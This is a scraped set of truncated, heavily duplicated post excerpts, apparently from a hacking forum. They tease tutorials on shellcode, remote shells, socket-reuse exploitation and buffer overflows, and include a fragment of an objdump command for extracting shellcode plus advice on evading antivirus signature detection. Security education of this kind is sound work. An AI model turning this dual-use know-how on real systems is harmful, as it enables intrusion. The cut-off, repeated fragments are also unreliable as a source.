I was hyped to deliver a second instalment of game hacking to the forums but I had lost interest due to the exhaustion gathered from exam preparation and particip&hellip;", "Hi @pry0cc It may be due to your shell. According to man page for echo     (...)    \\xHH   byte with hexadecimal value HH (1 to 2 digits)   NOTE: your shell may have its own version of echo, which usually supersedes the version described here.  Please refer to your shell&#39;s docu\u2010   mentation fo&hellip;", "Hi @pry0cc It may be due to your shell. According to man page for echo     (...)    \\xHH   byte with hexadecimal value HH (1 to 2 digits)   NOTE: your shell may have its own version of echo, which usually supersedes the version described here.  Please refer to your shell&#39;s docu\u2010   mentation fo&hellip;", "Hi @pry0cc It may be due to your shell. According to man page for echo     (...)    \\xHH   byte with hexadecimal value HH (1 to 2 digits)   NOTE: your shell may have its own version of echo, which usually supersedes the version described here.  Please refer to your shell&#39;s docu\u2010   mentation fo&hellip;", "Hi @pry0cc It may be due to your shell. According to man page for echo     (...)    \\xHH   byte with hexadecimal value HH (1 to 2 digits)   NOTE: your shell may have its own version of echo, which usually supersedes the version described here.  Please refer to your shell&#39;s docu\u2010   mentation fo&hellip;", "Hi @pry0cc It may be due to your shell. According to man page for echo     (...)    \\xHH   byte with hexadecimal value HH (1 to 2 digits)   NOTE: your shell may have its own version of echo, which usually supersedes the version described here.  Please refer to your shell&#39;s docu\u2010   mentation fo&hellip;", "Hi @0x00pf! I think I found a small typo. I found your shell command to generate shellcode didn\u2019t work, it just produced a tonne of binary jibberish, this is the revised version that worked for me (I just escaped the first \\ on the echo -n). for i in $(objdump -d rsh.o -M intel |grep &quot;^ &quot; |cut -f&hellip;", "I must say.  DTM and TxS making Xerxes is really cool.", "You must learn to forward before you can reverse.", "I fully concur with @_py and @TheDoctor. Just read as much as you can and at some point you will start knowing things, and you will find, at the same time, the path that better suits you\u2026 In that trip you may learn about stuff even more interesting that infosec", "I fully concur with @_py and @TheDoctor. Just read as much as you can and at some point you will start knowing things, and you will find, at the same time, the path that better suits you\u2026 In that trip you may learn about stuff even more interesting that infosec", "I fully concur with @_py and @TheDoctor. Just read as much as you can and at some point you will start knowing things, and you will find, at the same time, the path that better suits you\u2026 In that trip you may learn about stuff even more interesting that infosec", "I fully concur with @_py and @TheDoctor. Just read as much as you can and at some point you will start knowing things, and you will find, at the same time, the path that better suits you\u2026 In that trip you may learn about stuff even more interesting that infosec", "That\u2019s exactly my answer when I get asked how I learn! When I started to learn programming, I read each and every Python tutorial I could find out there . Everytime when I haven\u2019t understood something, I just held it in mind and later I stumbled upon it in another guide again, which covered it more&hellip;", "I hate to be the one telling you the truth but since not many will dare to do so, I will. Your approach and mindset will only cause the reverse of what you are expecting. You can\u2019t expect to learn something you are interested in based on experiences of others. Why is that? Simple. Every person is d&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "@Valkyr: Using a Teensy to Install Stuff in a Few Seconds", "Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "@0x00pf for the socket article, @IoTh1nkN0t for the PHP shell (now combine the two somehow)", "@0x00pf. ///////////", "@pry0cc For his work on the shell. Looking k00l AF", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "A few hundred for now:", "@0x00pf. ///////////", "@0x00pf for his dope remote shell tutorial!", "@IoTh1nkN0t for starting a PHP shell.", "And the winner is\u2026 @dtm! Congrats. @dtm previously won the old 1337 of the w33k and has contributed many h4rdc0r3 articles about h4x0rzing all sorts of stuff! @IoTh1nkN0t@0x00pf@pry0cc@Joe_Schmoe@Cal0X@dtm@TxS0voters Show resultsHello Loyal 0x00ers! For this month we are op&hellip;", "@0x00pf for his dope remote shell tutorial!", "Hi @zadyree, Thanks for passing by our site and for that great trick. I was really amaze when I read your code in shell-storm!. Actually it took me a while to realise what it was doing  Haven\u2019t thought about TOR. That is a very good point.", "Hi @zadyree, Thanks for passing by our site and for that great trick. I was really amaze when I read your code in shell-storm!. Actually it took me a while to realise what it was doing  Haven\u2019t thought about TOR. That is a very good point.", "Hi @zadyree, Thanks for passing by our site and for that great trick. I was really amaze when I read your code in shell-storm!. Actually it took me a while to realise what it was doing  Haven\u2019t thought about TOR. That is a very good point.", "Hi @zadyree, Thanks for passing by our site and for that great trick. I was really amaze when I read your code in shell-storm!. Actually it took me a while to realise what it was doing  Haven\u2019t thought about TOR. That is a very good point.", "Hi @zadyree, Thanks for passing by our site and for that great trick. I was really amaze when I read your code in shell-storm!. Actually it took me a while to realise what it was doing  Haven\u2019t thought about TOR. That is a very good point.", "Hi @zadyree, Thanks for passing by our site and for that great trick. I was really amaze when I read your code in shell-storm!. Actually it took me a while to realise what it was doing  Haven\u2019t thought about TOR. That is a very good point.", "Hi there. When I wrote this trick I had in mind it was not theorically valid, which led me not to propose an implementation for Metasploit for example. Hence, as an exploit coding fan, I suggest to rather use this shellcode for challenges and ROP your way for concrete and accurate socket-reuse explo&hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "When using vim go in command mode (press ESC) and then: :%!gpg --clearsign Then to save it to a file :w myfile.asc", "When using vim go in command mode (press ESC) and then: :%!gpg --clearsign Then to save it to a file :w myfile.asc", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "Honestly, I think you should always learn from a programmer\u2019s perspective. I see malware development as just normal programming but with malicious intent so they\u2019re not actually that different so you\u2019re probably much better off learning the proper coding styles, programming techniques, understanding&hellip;", "Your sentence is a bit stronger that what I suggested. I meant that, as far as the system configuration is the same (OS version, libc version, compiler version\u2026) in two different machines. Compiling the same source will produce the same binary. I do not know if what you said is true\u2026 never checked &hellip;", "Well, you need to have a local version of the program to exploit. I do not think you can write a exploit against a service without having access to the service itself and some details of the system. You have to get the program somehow (using some other flaw or getting it from other server with lowe&hellip;", "Well, you need to have a local version of the program to exploit. I do not think you can write a exploit against a service without having access to the service itself and some details of the system. You have to get the program somehow (using some other flaw or getting it from other server with lowe&hellip;", "I would say so for most of the cases. Somebody can rebuild the binary with special linker flags that mesh up the memory. Check the last section to see an example on how to relocate the text segment via linker flags. In that case you also need the Makefile, however I do not believe that happens very&hellip;", "Right. So if you could obtain the same binary as them, then it will be the same?", "I would say so for most of the cases. Somebody can rebuild the binary with special linker flags that mesh up the memory. Check the last section to see an example on how to relocate the text segment via linker flags. In that case you also need the Makefile, however I do not believe that happens very&hellip;", "Right. So if you could obtain the same binary as them, then it will be the same?", "Your sentence is a bit stronger that what I suggested. I meant that, as far as the system configuration is the same (OS version, libc version, compiler version\u2026) in two different machines. Compiling the same source will produce the same binary. I do not know if what you said is true\u2026 never checked &hellip;", "Ohhhhhhhh! I didn\u2019t realise the addresses were the same in every binary. That\u2019s dope. Okay thanks.", "Your sentence is a bit stronger that what I suggested. I meant that, as far as the system configuration is the same (OS version, libc version, compiler version\u2026) in two different machines. Compiling the same source will produce the same binary. I do not know if what you said is true\u2026 never checked &hellip;", "Well, you need to have a local version of the program to exploit. I do not think you can write a exploit against a service without having access to the service itself and some details of the system. You have to get the program somehow (using some other flaw or getting it from other server with lowe&hellip;", "Ohhhhhhhh! I didn\u2019t realise the addresses were the same in every binary. That\u2019s dope. Okay thanks.", "Well, you need to have a local version of the program to exploit. I do not think you can write a exploit against a service without having access to the service itself and some details of the system. You have to get the program somehow (using some other flaw or getting it from other server with lowe&hellip;", "Well, you need to have a local version of the program to exploit. I do not think you can write a exploit against a service without having access to the service itself and some details of the system. You have to get the program somehow (using some other flaw or getting it from other server with lowe&hellip;", "@pry0cc: The link is indeed not aimed at a scenario like the one @0x00pf presented. I linked it to you so you can get a general idea on how some of the modern exploit mitigations can be bypassed. The funny thing is that IoT/embedded devices barely manage to implement any of the aforementioned mitiga&hellip;", "@pry0cc: The link is indeed not aimed at a scenario like the one @0x00pf presented. I linked it to you so you can get a general idea on how some of the modern exploit mitigations can be bypassed. The funny thing is that IoT/embedded devices barely manage to implement any of the aforementioned mitiga&hellip;", "Thank you @py! This is a very good read. I do have some questions though. system = 0x8048380exit = 0x80483a0system_arg = 0x80485b5 He obtains these addresses by doing a hex dump of the binary. The only way he could do this would be if he already had shell access? This would never work for a rem&hellip;", "Thanks @_py and @pry0cc. Glad to heard you liked it. When facing ASLR and stack protections we have to dive into ROP, Return to Libc and other techniques more advanced. I believe it is difficult to follow that without knowing the basics\u2026", "Woah, this is so clever! Awesome tutorial once again, might use this for the Ret2libc tut ^^", "Clever. Is something like that possible on windows?", "AFAIK there is no direct equivalence to this on Windows. I\u2019m pretty sure it should be possible to reuse the existing connection but I bet the process would probably be pretty different\u2026 but I do not know how. Maybe some of the windows guy can provide some details.", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "Thanks @_py and @pry0cc. Glad to heard you liked it. When facing ASLR and stack protections we have to dive into ROP, Return to Libc and other techniques more advanced. I believe it is difficult to follow that without knowing the basics\u2026", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "Teach us master pico!", "@pry0cc: Enjoy.", "Teach us master pico!", "Thanks @_py and @pry0cc. Glad to heard you liked it. When facing ASLR and stack protections we have to dive into ROP, Return to Libc and other techniques more advanced. I believe it is difficult to follow that without knowing the basics\u2026", "Thanks @_py and @pry0cc. Glad to heard you liked it. When facing ASLR and stack protections we have to dive into ROP, Return to Libc and other techniques more advanced. I believe it is difficult to follow that without knowing the basics\u2026", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "Dude. Bruh. :is an understatement. This is really awesome. The connection reuse thing is such a dope concept. So. In this example, we deactivated ASLR, and disabled stack canaries. Stack based buffer overflows are all over the web. What can we do today? What do modern day exploits, well, exploit&hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "I fully agree with @oaktree. That said, these are my 2 cents: Malware. Malware heavily relies on low-level use of OS features, sometimes hidden features. As major OSes  provide a C interface, that is the natural language to interact with it. Otherwise you will probably end up adding C++ wrappers &hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "I fully agree with @oaktree. That said, these are my 2 cents: Malware. Malware heavily relies on low-level use of OS features, sometimes hidden features. As major OSes  provide a C interface, that is the natural language to interact with it. Otherwise you will probably end up adding C++ wrappers &hellip;", "Kicking 2017 off with a bang. Mamma mia!", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "I fully agree with @oaktree. That said, these are my 2 cents: Malware. Malware heavily relies on low-level use of OS features, sometimes hidden features. As major OSes  provide a C interface, that is the natural language to interact with it. Otherwise you will probably end up adding C++ wrappers &hellip;", "Ayyye, another malware guy! I\u2019d say stick with C/C++ for malware since you have more power over your resulting binary which destroys antivirus\u2019 signature-based detection. Having said that, assembly is probably a favourable addition upon them, especially for reverse engineering compiled binaries. If&hellip;", "I fully agree with @oaktree. That said, these are my 2 cents: Malware. Malware heavily relies on low-level use of OS features, sometimes hidden features. As major OSes  provide a C interface, that is the natural language to interact with it. Otherwise you will probably end up adding C++ wrappers &hellip;", "I fully agree with @oaktree. That said, these are my 2 cents: Malware. Malware heavily relies on low-level use of OS features, sometimes hidden features. As major OSes  provide a C interface, that is the natural language to interact with it. Otherwise you will probably end up adding C++ wrappers &hellip;", "I fully agree with @oaktree. That said, these are my 2 cents: Malware. Malware heavily relies on low-level use of OS features, sometimes hidden features. As major OSes  provide a C interface, that is the natural language to interact with it. Otherwise you will probably end up adding C++ wrappers &hellip;", "I fully agree with @oaktree. That said, these are my 2 cents: Malware. Malware heavily relies on low-level use of OS features, sometimes hidden features. As major OSes  provide a C interface, that is the natural language to interact with it. Otherwise you will probably end up adding C++ wrappers &hellip;", "As this site\u2019s loudest C++ programmer, I would suggest that you start with C. It gives you an appreciation for any higher level programming languages you may learn down the road, forces you to focus on the intricacies of your operating system, and is really good for disciplining a programmer. Yeah,&hellip;", "I know this question has probably been asked a million times already here but I just can\u2019t decide what to go with. Here\u2019s some background information on me. I\u2019m practically interested in malware, cryptography, reverse engineering and breaking stuff. Don\u2019t get me wrong, I\u2019m not here to do any harm t&hellip;", "As this site\u2019s loudest C++ programmer, I would suggest that you start with C. It gives you an appreciation for any higher level programming languages you may learn down the road, forces you to focus on the intricacies of your operating system, and is really good for disciplining a programmer. Yeah,&hellip;", "When using vim go in command mode (press ESC) and then: :%!gpg --clearsign Then to save it to a file :w myfile.asc", "Right\u2026 % means select the whole text !cmd means pipe the selected text into the command cmd and substitute that text with the output of the command The command can be anything, including pipes\u2026 %!gzip|base64", "When using vim go in command mode (press ESC) and then: :%!gpg --clearsign Then to save it to a file :w myfile.asc", "Right\u2026 % means select the whole text !cmd means pipe the selected text into the command cmd and substitute that text with the output of the command The command can be anything, including pipes\u2026 %!gzip|base64", "When using vim go in command mode (press ESC) and then: :%!gpg --clearsign Then to save it to a file :w myfile.asc", "Right\u2026 % means select the whole text !cmd means pipe the selected text into the command cmd and substitute that text with the output of the command The command can be anything, including pipes\u2026 %!gzip|base64", "Right\u2026 % means select the whole text !cmd means pipe the selected text into the command cmd and substitute that text with the output of the command The command can be anything, including pipes\u2026 %!gzip|base64", "Right\u2026 % means select the whole text !cmd means pipe the selected text into the command cmd and substitute that text with the output of the command The command can be anything, including pipes\u2026 %!gzip|base64", "Awesome. No plugins needed, right?", "Awesome. No plugins needed, right?", "When using vim go in command mode (press ESC) and then: :%!gpg --clearsign Then to save it to a file :w myfile.asc", "When using vim go in command mode (press ESC) and then: :%!gpg --clearsign Then to save it to a file :w myfile.asc", "Note that you will need to have GnuPG (GPG) installed before starting the tutorial. The theory behind this is very similar to that of the signing a file, only that clearsigning allows you to sign messages not files. This is ideal for when you want to sign a Tweet, a blog post, or anything else of t&hellip;", "Here\u2019s another one for you ~/Bin/ portsync.sh #!/bin/bashhost=$1port=$2opts=$3ssh -p 4350 $opts $host -L $port:localhost:$port -NUsage: portsync.sh hostname port flags ex. portsync.sh 192.168.1.50 8384 -f (-f is to fork into background), now you can access port 8384 which has binded to loc&hellip;", "These are the ones I found useful in the last days: alias getip=&#39;curl http://ipinfo.io/ip&#39;alias proxy=&#39;proxychains&#39;alias proxyip=&#39;proxychains curl http://ipinfo.io/ip&#39;", "In order to complete the table in The Price of Scripting, I will add a couple more implementations: Lua#!/usr/bin/luan, t = io.read (&quot;*n&quot;, &quot;*n&quot;)w= {}for i=0, n - 1 do    w[i] = io.read(&quot;*n&quot;)endfor k=1, t do    i,j = io.read(&quot;*n&quot;, &quot;*n&quot;)    print (math.min(table.unpack(w, i, j)))endPerl&hellip;", "Hi fellas, Following the practical cases of @VoidAccess, I wanted to introduce you the reputation trust model and a piece of history behind PGP. As you probably already know, PGP, which stands for \u201cPretty Good Privacy\u201d, has been developed by Phil Zimmermann in 1991. The general purpose of this tec&hellip;", "From the point of view of hiding your IP they may look the same, but technically they are completely different beasts. The most obvious difference between both is that the VPN usually encrypts the traffic an works transparently for all applications (you basically get a new network interface, a tunn&hellip;", "My deepest appreciation. Thanks for everything!  Many, many kudo\u2019s to you @L0k1", "Thank you @L0k1! I am so grateful to what you provide, and what you have provided! I cannot wait to see what the community will do when unshackled from lack of funds! Also. MIA. I can\u2019t wait to hear more about that!!!", "Thank you so much for all you\u2019ve done! You all should get to know @L0k1 because he\u2019s a badass.", "Not a problem, keep up the awesome work with the community. Just wait till I do a full writeup on Mia XD", "Good day all, Seeing as this is my first real post here, and I\u2019m fairly certain a few of you know me, but the large majority don\u2019t, I\u2019ll introduce myself a little, and then continue from there. Names Mike, I go by L0k1 online, which is what most of you will come to know me as. I\u2019ve been involved i&hellip;", "Hello peepz, Been a while since I last posted something. Have been very busy with ma study Computer Science which I started this year. Anyway: A few days ago my dummie book: \u2018HTML5, CSS, JavaScript, PHP and MySQL for Dummies\u2019. So I\u2019ve gone trough most of the book now and decided it was time to &hellip;", "A little bit\u2026 AVR, Propeller, ESP8226\u2026 that kind of stuff\u2026 half-way between SW and HW, but closer to SW", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "If you just use electronics powered by 12V 1A there is not that much that can go wrong. So unless you build your own Rectifier, there shouldn\u2019t be any really big dangers (Correct me if I\u2019m wrong though).", "A little bit\u2026 AVR, Propeller, ESP8226\u2026 that kind of stuff\u2026 half-way between SW and HW, but closer to SW", "A little bit\u2026 AVR, Propeller, ESP8226\u2026 that kind of stuff\u2026 half-way between SW and HW, but closer to SW", "Pico is  hardware guy too?", "Cool!.. you gonna love AVRs", "Cool!.. you gonna love AVRs", "Hi, 0x00sec. Long time no see  I got a new hobby - electronics. And I would like to recommend a book that helped me a lot with it. The book is \u201cMake: Electronics\u201d by Charles Platt. Best thing about it is that you can order a book with all necessary components (a.k.a starter kit). Also it\u2019s transla&hellip;", "No. It creates a process at the beginning and starts \u201cdebugging\u201d it. Not sure if that can be avoided. After that is works like a normal debugger when you run the program step by step, but decrypting the next 16 bytes (starting at current RIP value) in memory before running each step and crypting the&hellip;", "No. It creates a process at the beginning and starts \u201cdebugging\u201d it. Not sure if that can be avoided. After that is works like a normal debugger when you run the program step by step, but decrypting the next 16 bytes (starting at current RIP value) in memory before running each step and crypting the&hellip;", "One more thing: Does this PoC make a new process for every 16 bytes? If so: Isn\u2019t that costly? Is there a way around this?", "One more thing: Does this PoC make a new process for every 16 bytes? If so: Isn\u2019t that costly? Is there a way around this?", "Hey @fraq, Thanks for reading and for the interesting comments. First of all, let me say that this was just a PoC. I didn\u2019t though much further, but we can do it now. So these are my first thoughts to kick off the discussion. I do not think the search space is that small, but I haven\u2019t checked it&hellip;", "Hey @fraq, Thanks for reading and for the interesting comments. First of all, let me say that this was just a PoC. I didn\u2019t though much further, but we can do it now. So these are my first thoughts to kick off the discussion. I do not think the search space is that small, but I haven\u2019t checked it&hellip;", "Hey @fraq, Thanks for reading and for the interesting comments. First of all, let me say that this was just a PoC. I didn\u2019t though much further, but we can do it now. So these are my first thoughts to kick off the discussion. I do not think the search space is that small, but I haven\u2019t checked it&hellip;", "I\u2019m gonna have to read this like 4 more times to digest it, but I did have one concern. There is a very limited set of instructions. This small vocabulary presents a very small search space for attacking the cipher text. Further, repeatedly encrypting and decrypting the same message (the instructio&hellip;", "This is going to take some serious re-reading. Great post, as usual\u2026 I wish I was there for the IRC brainstorming.", "Thanks @SmartOne. All my code is GPL so anybody can use/modify/redistribute it. Be free to put it anywhere you want and modify it as you wish. Just, please, honour the GPL license and release publicly any modification you do to the code also as a GPL module. That\u2019s it.", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "So the Dutch intelligence agency has posted a Christmas Puzzel. It\u2019s related to cryptography and steganography mainly. The puzzel is in dutch, but I think a lot of them can be made by English people as well. You can find the puzzel here:  So I did the first 2 and I think googling the Dutch ver&hellip;", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "Hell yea, getting jiggy with the jit.", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "Thanks @SmartOne. All my code is GPL so anybody can use/modify/redistribute it. Be free to put it anywhere you want and modify it as you wish. Just, please, honour the GPL license and release publicly any modification you do to the code also as a GPL module. That\u2019s it.", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "Thanks @SmartOne. All my code is GPL so anybody can use/modify/redistribute it. Be free to put it anywhere you want and modify it as you wish. Just, please, honour the GPL license and release publicly any modification you do to the code also as a GPL module. That\u2019s it.", "Nice concept! Maybe you could put it on our 0x00sec Gitlab?", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "Winner: @NitraxWell done @Nitrax for winning this month\u2019s 1337 0f the M0n7h! The community has loved your content from the past month, and have chosen you for this month! I hope you enjoy the perks of being a 1337 0f the M0n7h winner  Hello Loyal 0x00ers! For this month we are open for nominati&hellip;", "@Valentine I don\u2019t make a great nominee at the moment due to my frequent absence. Give the award to someone who puts in a lot more effort! I say @TheDoctor and @0x00pf, aswell as @dtm should be nominates. They\u2019ve put in a REALLY big effort since 0x00sec even began! -Phoenix750", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "@TheDoctor and @0x00pf.", "@0x00pf &amp; @dtm. Always there; even if you can\u2019t see them .", "Hello, my loyal 0x00\u2019ers! You are reading my 4th Installment of Paranoia and a Terminal! Today we are going to discuss how to set up a Tor Service; and how to access it. Tor services are a really good addition to your toolkit as a Paranoid hacker. Tor can be used as an Anonymity tool, but providing&hellip;", "Hi fellas, As part of my work, I did plenty of researches about hacking / pentesting operating systems in order to find which one could be the most suitable for my needs. Chose his operating system is crucial and avoids unpleasant surprises that could lead to an incredible wastage of time (tools in&hellip;", "Nice update @oaktree. My request wasn\u2019t personal. I was hoping that others will benefit from a simple visualization. When you can draw a concept, you understand it much better. Moreover, the whole meat of free() seems to rely on the unlink() macro. Just throwing ideas at you for future posts in cas&hellip;", "It\u2019s been a while since the last edition (I do say this every time). Behold, a seventh article! Allow me to restate the prerequisites: Proficiency in CUnderstanding of the Stack vs HeapFamiliarity with this article\u2019s predecessors (all of them).Disclaimer: what follows are my findings, and my &hellip;", "Thanks mate! I\u2019m glad to contribute to this nice community!", "Start with Brainfuck, I wouldn\u2019t recommend it though", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Thanks mate! I\u2019m glad to contribute to this nice community!", "GCHQ have a crack me, which involves many aspects of offensive security to be excercised. I am eager to see how you all tackle it! PS: remember those spoiler tags  http://www.canyoucrackit.co.uk", "This is a very thorough write up of an old but previously unknown 0day exploit for Ubuntu 12.04.5, leveraging libgstnsf.so in gstreamer 0.10.x to bypass 64-bit ASLR and DEP. Essentially that version of gstreamer uses 6502 assembly code to emulate the NES\u2019 CPU and sound hardware in realtime, which d&hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "Thanks mate! I\u2019m glad to contribute to this nice community!", "Thanks mate! I\u2019m glad to contribute to this nice community!", "Mann! The minute I saw this I just had to scroll down and like this first. I must say; you put so much effort into these articles, and it\u2019s really nice. You\u2019re such a good contributor pico; I would love to say a big thank you from me, and I\u2019m sure the whole community would also agree. You should w&hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "Hi fellas, Following my conversations with you guys on IRC about the job of pentester, I decided to introduce you the different facets of a pentesting and maybe enlighten gray areas that remain in this domain. Disclaimer : Once again, it will be a long reading  PentestingCompanies spend millions&hellip;", "I suggest grab a book and read,read,read\u2026 of course practicing the concept but don\u2019t forget to also learn the inner workings of the code itself. I\u2019ve recently started to realize that there\u2019s more to coding then just coding. A computer is a very complex piece of technology and just because you can bu&hellip;", "Sentdex has by far one of the best playlists on python (beginner - intermediate - even Machine Learning).  I wouldn\u2019t recommend codecademy unless you have never heard of programming before. Enjoy\u2026", "Continuing the discussion from Challenge: Brute and Smart: Did you solved the Brute and Smart challenge (Challenge: Brute and Smart)? In case you did and you wonder if your solution was right or you didn\u2019t solve it and you wonder how to do it\u2026 here is my write up. The program asked for a 6 digit l&hellip;", "Continuing the discussion from Challenge: Brute and Smart: Did you solved the Brute and Smart challenge (Challenge: Brute and Smart)? In case you did and you wonder if your solution was right or you didn\u2019t solve it and you wonder how to do it\u2026 here is my write up. The program asked for a 6 digit l&hellip;", "Continuing the discussion from Challenge: Brute and Smart: Did you solved the Brute and Smart challenge (Challenge: Brute and Smart)? In case you did and you wonder if your solution was right or you didn\u2019t solve it and you wonder how to do it\u2026 here is my write up. The program asked for a 6 digit l&hellip;", "Thanks, and yeah, Perl wooooooooooo!! Though I\u2019m still very new to it. As for the message\u2026 Sure\u2026 Sure thing.  Oh yeah, thanks for another challenge.", "Very good @dtm. This was actually a pretty smart approach. And kudos for using Perl  Did you actually got enlightened by the hidden message  ? I will publish the write up in a while with all the details in a while", "Continuing the discussion from Challenge: Brute and Smart: Did you solved the Brute and Smart challenge (Challenge: Brute and Smart)? In case you did and you wonder if your solution was right or you didn\u2019t solve it and you wonder how to do it\u2026 here is my write up. The program asked for a 6 digit l&hellip;", "Thanks, and 